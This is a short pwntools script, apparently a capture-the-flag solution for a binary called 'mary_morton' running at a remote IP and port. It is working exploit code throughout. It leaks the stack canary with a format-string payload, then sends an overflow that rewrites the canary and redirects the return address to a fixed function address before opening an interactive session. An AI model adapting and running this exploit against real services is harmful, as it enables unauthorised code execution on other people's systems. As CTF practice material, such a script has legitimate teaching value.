from pwn import *
import time

#p = process("mary_morton")
p = remote("146.185.132.36", 19153)
print p.recv()
p.sendline("2")
time.sleep(0.1)
p.send("%31$9p")
p.recvuntil("0x")
canary = int(p.recvuntil("1.")[:-2],16)
print hex(canary)
print p.recv()
p.sendline("1")
raw_input()
time.sleep(0.1)
p.sendline(p64(canary)*19+p64(0x4008DA))
print p.recv()
p.interactive()
